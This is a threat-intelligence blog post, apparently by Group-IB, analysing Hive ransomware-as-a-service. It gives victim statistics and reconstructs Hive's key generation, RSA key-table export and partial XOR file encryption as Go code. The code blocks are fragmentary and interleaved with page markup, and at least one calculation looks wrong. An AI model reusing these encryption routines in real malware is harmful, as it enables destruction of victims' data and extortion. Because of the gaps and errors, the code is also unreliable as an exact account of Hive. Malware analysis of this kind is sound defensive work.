                            <h1 class="header__title title-h2 mb-24 mt-md-48 mt-lg-64 mt-xl-64">Inside the Hive</h1><p class="header__text mb-xs-48 mb-64 mb-lg-96 mb-xl-96">Deep dive into Hive RaaS, analysis of latest samples</p><div class="post-info__date mb-24 mb-lg-32 mb-xl-48"><div class="body2">December 9, 2021 · <span id="reading-time"></span> min to read · Ransomware</div></div><div class="post-info__image mb-24 mb-lg-32 mb-xl-48"><picture><source srcset="https://www.group-ib.com/wp-content/uploads/hive.png.webp" type="image/webp"><img src="https://www.group-ib.com/wp-content/uploads/hive.png" alt="" class="webpexpress-processed"></picture></div><div class="post-info__tags"><div class="post-info__tag body2">Cybersecurity</div><div class="post-info__tag body2">Hive</div><div class="post-info__tag body2">Ransomware</div><div class="post-info__tag body2">Threat Intelligence</div></div>                        </div>
                    </div>
                </div>
                <div class="blog-post-content" id="blog-post-content">
                    <div class="blog-post-content__section--text"><p>In the first 11 months of 2021, <strong>over 60%</strong> of all incidents investigated by Group-IB involved ransomware. Ransomware has finally established itself as cyber threat number one.</p>
<p>In July 2021, international media <a href="https://www.group-ib.com/media-center/press-releases/gib-2021-2022-report/" target="_blank" rel="noopener">reported</a> that REvil ransomware operators demanded a record-breaking ransom of <strong>$70 millions</strong> from meat giant JBS in exchange for providing the decryption key. The record didn&#8217;t stand long. It took the ransomware empire less than half a year to grow this ransom demand 3-fold to <strong>$240 millions</strong>. In November 2021, Europe&#8217;s largest consumer electronics retailer Media Markt <a href="https://www.bleepingcomputer.com/news/security/mediamarkt-hit-by-hive-ransomware-initial-240-million-ransom/" target="_blank" rel="noopener">fell prey</a> to a ransomware attack. It turned out that the perpetrator behind the incident was Hive, which used to take a back seat. Both threat actors worked under the <a href="https://www.group-ib.com/resources/knowledge-hub/raas/" target="_blank" rel="noopener">Ransomware-as-a-Service (RaaS)</a> model and frequently released victim data on their DLS (data leak sites, where the data belonging to companies that refuse to pay a ransom is published).</p>
<p>The main factors behind the rise of the ransomware empire were the use of the double extortion technique based on DLS, the active development of the RaaS program market, as well as the increasing popularity of ransomware programs among financially cybercriminals who used to have a more difficult way to make money.</p>
<p>According to the &#8220;<a href="https://www.group-ib.com/resources/research-hub/htct-2021-uninvited-guests/" target="_blank" rel="noopener">Hi-Tech Crime Trends 2021/2022. Part II. Corporansom: threat number one</a>&#8221; released earlier in the day, the number of victims whose data has been published on DLSs has grown by unprecedented <strong>935%</strong> from 229 to 2,371 during the period from H2 2020 to H1 2021 compared to the corresponding period a year earlier. Despite the &#8220;protests&#8221; of several underground forum administrators united by the &#8220;No more ransom!&#8221; motto, in the review period, 21 new partner programs emerged, which is a 19-percent increase year-on-year.</p>
<p>As the entire world was watching REvil&#8217;s forced rebranding, the victim count of ransomware Hive, which appeared in June 2021, continued to surge. If one tried to evaluate Hive&#8217;s private affiliate program based on the number of victims whose data was released on DLS (48), they wouldn&#8217;t be impressed.</p>
<p>On closer examination, this RaaS program turns out to be one of the most aggressive ones, with Hive operators using the most urgent methods of pressure on the target organizations and distinctive TTPs, which arу worth being examined.</p>
<p>For technical experts, the blog post authors have included dedicated parts with info on methods and approaches that can be used to hunt for Hive operators. They also present a comprehensive analysis of the Hive ransomware sample, indicators of compromise, and YARA rules, which should help analysts identify the Hive attacks.</p>
<p>Hive affiliates have been busy as bees: the actual number of their victims is in the hundreds despite the fact that the affiliate program has been active less than half a year. Due to Hive DLS&#8217;s specific characteristics and its admin panel, Group-IB Threat Intelligence analysts have managed to determine that as of October 16, 2021, at least <strong>355 companies</strong> fell victim to the threat actor.</p>
<p>Hive affiliates resort to various initial compromise methods: vulnerable RDP servers, compromised VPN credentials, as well as phishing emails with malicious attachments. The data encryption is often carried out during non working hours or at the weekend. Taking into account that Hive targets organizations from various economic sectors from all around the world and their attacks are manually controlled by the affiliates, it&#8217;s crucial to closely monitor the changes in TTPs of these ransomware operators.</p>
<p>Group-IB Threat Intelligence teams have analyzed the latest available samples of <strong>Hive</strong> and for the first time analyzed the affiliate program from the inside, having tracked down it to its creation.</p>

<h2>Hive for Windows</h2>

<p>In this article we will examine the file encryption algorithms implemented in the latest versions of Hive. In the previous versions, the encryption was implemented in a similar way, therefore the following results of the technical analysis will also give a general idea of the implementation of encryption in earlier versions.</p>
<p>For a detailed representation of the described elements, we will use a programming language Go, which Hive developers wrote their malware in. Most functions will be called by the terms which are similar to those used by Hive developers. The code presented below has been slightly simplified, but it is consistent with the algorithms laid down by Hive developers.</p>
<h3>Two main data structures used in Hive ransomwares:</h3>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">// Key table structure
type EncryptionKeyTab struct {
  Data []byte
  Hash []byte
}


// HiveContext structure
type HiveContext struct {
  KeyTab *EncryptionKeyTab
  RansomExt string
  RansomNoteName string
  RansomNote string
  FileSkipList string
  SkipWipe bool
  NumThreads int
  CmdArgs []string
  FileSkipRegexp *regexp.Regexp
  SkipRegexp *regexp.Regexp
  EncSkipRegexp *regexp.Regexp
  ServiceStopList string
  ProcessKillList string
  GrantPermissions bool
  ProcessKillRegexp *regexp.Regexp
  ServiceStopRegexp *regexp.Regexp
}</div></div></div><div class="blog-post-content__section--text"><p>EncryptionKeyTab is the structure of the encryption key table.</p>
<p>HiveContext is the structure containing the main Hive ransomware&#8217;s data, such as file contents encryption key table, software configuration data (the extensions of the encrypted files, the name of the file containing ransom demand and its contents, lists of processes and services), command line arguments, compiled regular expressions, etc. Depending on the build of the sample, the structure of HiveContext can slightly differ.</p>
<h3>Hive main function:</h3>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">// Hive main function
func (ctx *HiveContext) RunProcess() {

  ctx.Init()

  ctx.ExportKey()

  ctx.Preprocess()

  ctx.PreNotify()

  ctx.ScanFiles()

  ctx.EncryptFiles()

  ctx.EraseKey()

  ctx.Notify()

  ctx.WipeSpace()

<h2>Key table</h2>
<p>At the start, Hive ransomwares generate a key table for encrypting file contents in the form of an array of random data 1 MB (1 048 576 bytes) in size. To generate the key table, the malware uses a standard function rand.Read from the Go cryptographic package &#8220;crypto/rand&#8221;.</p>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">// Hive initialization

  mathrand.Seed(time.Now().UnixNano())

  // Generate key table
  ctx.KeyTab = GenKeyTab()

  // Etc
  …
}


// Generate key table
func GenKeyTab() *EncryptionKeyTab {

  data := make([]byte, 0x100000, 0x100000)
  cryptorand.Read(data)

  var keytab EncryptionKeyTab

  keytab.Data = data

  hash := sha512.Sum512_256(data)

  keytab.Hash = hash[:]

  return &keytab
}</div></div></div><div class="blog-post-content__section--text"><p>As can be observed in the GenKeyTab function, after generating a key table, an additional hash SHA512-256 of its contents is calculated via the sha512.Sum512_256 function from the Go package &#8220;crypto/sha512&#8221;. Consequently, the value of this hash, which is 32 bytes in size, will be repeatedly used in the software.</p>
<p>After completing the initialization of the Init program, a generated key table is exported. And here Hive developers showed quite an original approach.</p>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">// Export key table

// Import RSA public keys
func ImportRSAPubKeys() []*rsa.PublicKey {

  var pubkeys []*rsa.PublicKey

  for i := 0; i < len(RSAPubKeyDerDataList); i++ {

    pubkey, _ := x509.ParsePKCS1PublicKey(RSAPubKeyDerDataList[i])

    pubkeys = append(pubkeys, pubkey)
  }

  return pubkeys

Initially, the keys are stored in the encrypted form, and when the malware starts, they are decrypted and placed in a global list that we called RSAPubKeyDerDataList. To use these RSA keys for key table encryption, they are imported beforehand.</p>
<p>The contents of the keytab are encrypted by blocks via encryption algorithm RSA-OAEP with iterative use of the 20 above mentioned RSA keys. The size of each block is equal to the maximum acceptable size of the encrypted data, which is defined by the length of the corresponding RSA key.</p>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">// Encrypt key table
func (keytab *EncryptionKeyTab) Export(pubkeys []*rsa.PublicKey) []byte {

  dst_data := make([]byte, 0, 0x200000)

  pos := 0
  rem_len := len(keytab.Data)
  num_keys := len(pubkeys)

  i := 0

  for rem_len > 0 {

    pubkey := pubkeys[i % num_keys]

    chunk_size := pubkey.Size() - (2 * 32 + 2)
    if chunk_size > rem_len {
      chunk_size = rem_len
    }

    hash := sha512.New512_256()

    rng := cryptorand.Reader

    enc_chunk, _ := rsa.EncryptOAEP(hash, rng, pubkey,
                                    keytab.Data[pos : pos + chunk_size],
                                    nil)

    dst_data = append(dst_data, enc_chunk...)

    pos += chunk_size
    rem_len -= chunk_size
    i++
  }

  return dst_data

</div>

</div>

<h2>File content encryption</h2>
<p>Now let&#8217;s have a look at the most interesting part – the implementation of file contents encryption.</p>
<p><strong>File encryption function presented in the Go language:</strong></p>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">// Encrypt file
func (keytab *EncryptionKeyTab) EncryptFilename(filename string,
                                                ransom_ext string) error {

  n1 := mathrand.Uint32()
  n2 := mathrand.Uint32()

  var ext_data [42]byte

  copy(ext_data[:32], keytab.Hash)
  ext_data[32] = 0xFF
  *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(&ext_data[33])))) = n1
  *(*uint32)(unsafe.Pointer(uintptr(unsafe.Pointer(&ext_data[37])))) = n2
  ext_data[41] = 0x34

  file_ext := base64.URLEncoding.EncodeToString(ext_data[:])

  new_filename := filename + "." + file_ext + "." + ransom_ext

  err := os.Rename(filename, new_filename)
  if err != nil {
    return err
  }

  // Encrypt file data
  return keytab.EvaluateFilename(new_filename, n1, n2)

In this case, to generate numbers, a standard pseudorandom sequence generator from the Go &#8220;math/rand&#8221; package is used. As seen above, in a fragment of the Init function a pseudorandom sequence is generated using the current time set on the victim&#8217;s system:</p>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">mathrand.Seed(time.Now().UnixNano())</div></div></div><div class="blog-post-content__section--text"><p>These two random numbers are used to form the name of the encrypted file, and, notably, to encrypt the file data. After that, the file is renamed and encrypted.</p>
<p>This is how the name of an encrypted file looks like:</p>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">[FILE_NAME].[ENCRYPTED_EXT].[RANSOM_EXT]</div></div></div><div class="blog-post-content__section--text"><p>FILE_NAME is the name of the original unencrypted file.</p>
<p>ENCRYPTED_EXT is the extension of the encrypted file, 56 symbols long, which is received as a result of converting the original key table contents&#8217; hash into the line Base64 with adding the following data at the end: the 0FFh byte, 32-bit numbers n1 and n2 (little-endian byte sequence) and the 34h byte (42 bytes total).</p>
<p>RANSOM_EXT is a configuration parameter that defines extensions of the encrypted files.</p>
<p>For example, the name</p>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">filename.ext.sb8SzAPVNWhK66-6cahq7Ah8gGmOJCykPSI5D07wFMH_0Xg0sk1aRdc0.xxxxx</div></div></div><div class="blog-post-content__section--text"><p>corresponds to the following data:</p>
<p><picture><source srcset="https://www.group-ib.com/wp-content/uploads/07-min.png.webp" type="image/webp"><img decoding="async" class="alignnone size-full wp-image-20564 webpexpress-processed" src="https://www.group-ib.com/wp-content/uploads/07-min.png" alt="" width="784" height="84"></picture></p>
<p>In this case, the numbers n1 and n2 have the values 0B23478D1h and 0D7455A4Dh respectively.</p>
<p>In Hive, files are encrypted by blocks 4096 bytes in size, with the maximum number of blocks encrypted within a file amounting to 25, which corresponds to 102,400 bytes of encrypted data. There can be an interval separating the encrypted blocks, the size of which if defined by the file size. The encryption is implemented using byte-by-byte XOR with two byte sequences from the keytab 102,400 bytes and 3,072 bytes respectively. The starting positions in the sequences are defined using the n1 and n2 numbers respectively.</p>
<p><strong>File contents encryption code:</strong></p>
</div>
                            
                            <div class="blog-post-content__section"><div class="code"><div class="code__wrapper">// Encrypt file data
func (keytab *EncryptionKeyTab) EvaluateFilename(filename string,
                                                 n1 uint32,
                                                 n2 uint32) error {

  f, err := os.OpenFile(filename, os.O_RDWR, 0600)
  if err != nil {
    return err
  }

  defer f.Close()

  file_info, err := f.Stat()
  if err != nil {
    return err
  }

  file_size := file_info.Size()

  var num_blocks int = int(30 * (file_size / 4096) / 100)

  if file_size == 0 {
    return nil
  }

  if file_size <= 4096 {
    num_blocks = 1
  } else if (num_blocks < 2) {
    num_blocks = 2
  } else {
    if (num_blocks > 25) {
      num_blocks = 25
    }
  }

  key_data1_pos := n1 % 0xE7000
  key_data1 := keytab.Data[key_data1_pos : key_data1_pos + 0x19000]

  key_data2_pos := n2 % 0xFF400
  key_data2 := keytab.Data[key_data2_pos : key_data2_pos + 0xC00]

  var buf [4096]byte

  var total_pos int = 0

  var block_space int64

  if num_blocks > 1 {
    block_space = 0
  } else {
    block_space = (file_size - int64(num_blocks * 4096)) /
                  int64(num_blocks - 1)
  }

  for block_num := 1; block_num <= num_blocks; block_num++ {

    var file_off int64

    if block_num == 1 {
      file_off = 0
    } else if block_num == num_blocks {
      if file_size > file_off + 4096 {
        file_off = file_size - 4096
      }
    } else {
      file_off += int64(block_space)
    }

    bytes_read, err := f.ReadAt(buf[:], file_off)
    if (err != nil) && (err != io.EOF) {
      return err
    }

    if bytes_read == 0 {
      break
    }

    // Encrypt block
    for i := 0; i < bytes_read; i++ {
      pos := total_pos + i
      buf[i] ^= key_data1[pos % 0x19000] ^ key_data2[pos % 0xC00]
    }

    _, err = f.WriteAt(buf[:bytes_read], file_off)
    if err != nil {
      return err
    }

    file_off += int64(bytes_read)
    total_pos += bytes_read
  }

  return nil
}</div></div></div><div class="blog-post-content__section--text"><p>When the files are encrypted, the file encryption key table is erased from the system&#8217;s memory (EraseKey function). Therefore, to decrypt each file, the initial encryption key table is required, as well as the values of n1 and n2 numbers are required, extracted from this file name.</p>
<p>From threat actors&#8217; point of view, the main advantages of this approach to file encryption are the file size, which remains unchanged after the encryption, and the encryption speed. High encryption speed is also determined, among other factors, by the original file size. As opposed to many other ransomware samples, Hive does not write its metadata directly in the encrypted file. This advantage additionally complicates file recovery process, since the operating system will likely rewrite data in the same clusters. This system, however, does not look ideal when it comes to stability.</p>
<p>In comparison, in the previous Hive versions the key table size amounts to 10 MB and the number of RSA keys used to encrypt it reaches 100. Content encryption is also performed using a similar algorithm based on the byte-by-byte XOR.</p>

<script>
    const postcontent = document.getElementById('blog-post-content');
    const h2counter = postcontent.getElementsByTagName('h2');

    for (i = 0; i < h2counter.length; i++) {
        const h2elementtag = postcontent.getElementsByTagName('h2')[i];
        const h2element = postcontent.getElementsByTagName('h2')[i].innerHTML;
        let postnavitem = document.createElement('a');
        postnavitem.classList.add('post-navigation__item', 'subtitle2', 'scrollto');
        postnavitem.innerHTML = h2element;
        const postnavlink = postnavitem.innerHTML;
        let str = postnavlink;
        str = str.replace(/<[^>]*>/g, '');
        str = str.replace(/[^a-zA-Z0-9\s\u0400-\u04FF]/g, '');
        str = str.replace(/\s+/g, '-').toLowerCase();
        str = str.replace(/^-+|-+$/g, '');
        postnavitem.classList += ' ' + str;
        postnavitem.href = '#' + str;
        h2elementtag.id = str;
        document.getElementById('post-navigation__wrapper').appendChild(postnavitem);
    }

    const sections = document.querySelectorAll('h2');
    const navItems = document.querySelectorAll('.post-navigation__item');

    window.addEventListener('scroll', () => {
        let current = '';
        sections.forEach((section) => {
            const sectionTop = section.offsetTop;
            const sectionHeight = section.clientHeight;
            if (pageYOffset >= sectionTop - sectionHeight / 10) {
                current = section.getAttribute('id');
            }
        });

        navItems.forEach((a) => {
            a.classList.remove('active');
            if (a.classList.contains(current)) {
                a.classList.add('active');
            }
        });
    });

    // SMOOTH SCROLL
    var $root = jQuery('html, body');


    jQuery('a[href^="#"].scrollto').click(function() {
        var href = jQuery.attr(this, 'href');
        var headerHeight = 100;

        $root.animate({
                scrollTop: jQuery(href).offset().top - headerHeight
            },
            300,
        );

        return false;
    });

    // SMOOTH SCROLL WITH NO HASH
    var $root = jQuery('html, body');


    jQuery('a[href^="#"].scrolltonohash').click(function() {
        var href = jQuery.attr(this, 'href');
        var headerHeight = 100;

        $root.animate({
                scrollTop: jQuery(href).offset().top - headerHeight
            },
            300
        );

        return false;
    });
</script>

<script>
    function readingTime() {
        const text = document.getElementById("blog-post-content").innerText;
        const wpm = 225;
        const words = text.trim().split(/\s+/).length;
        const time = Math.ceil(words / wpm);
        document.getElementById("reading-time").innerText = time;
    }
    readingTime();
</script>

    function positioningSidebar() {
        let sidebar = document.getElementById('sidebar');
        let sidebarHeight = sidebar.offsetHeight;
        let windowHeight = document.documentElement.clientHeight;
        if (windowHeight < (sidebarHeight + 48)) {
            let sidebarAuthors = sidebar.querySelector('.sidebar__authors');
            let sidebarMorePosts = sidebar.querySelector('.sidebar__more-posts');
            let authorsHeight = sidebarAuthors ? sidebarAuthors.offsetHeight : 0;
            let morePostsHeight = sidebarMorePosts ? sidebarMorePosts.offsetHeight : 0;
            let sidebarTop = authorsHeight + morePostsHeight + 140;
            jQuery(sidebar).css('top', -sidebarTop + 'px');
        } else {
            jQuery(sidebar).css('top', '72px');
        }
    }
    window.addEventListener('resize', positioningSidebar);
    positioningSidebar();

    if (localStorage.getItem('theme')) {
        if (localStorage.getItem('theme') == 'dark') {
            jQuery('body').addClass('theme--dark');
        } else if (localStorage.getItem('theme') == 'light') {
            jQuery('body').addClass('theme--white');
        }
    } else {
        localStorage.setItem('theme', 'dark');
        jQuery('body').addClass('theme--dark');
    }

    jQuery('.theme-toggle').click(function() {
        if (localStorage.getItem('theme') == 'dark') {
            localStorage.setItem('theme', 'light');
        } else {
            localStorage.setItem('theme', 'dark');
        }
        jQuery('body').toggleClass('no-transition');
        jQuery('body').toggleClass('theme--dark');
        jQuery('body').toggleClass('theme--white');
        setTimeout(() => {
            jQuery('body').toggleClass('no-transition');
        }, 250);
    });
    jQuery('.share-toggle').click(function() {
        jQuery('.share-toggle').toggleClass('active');

</script>
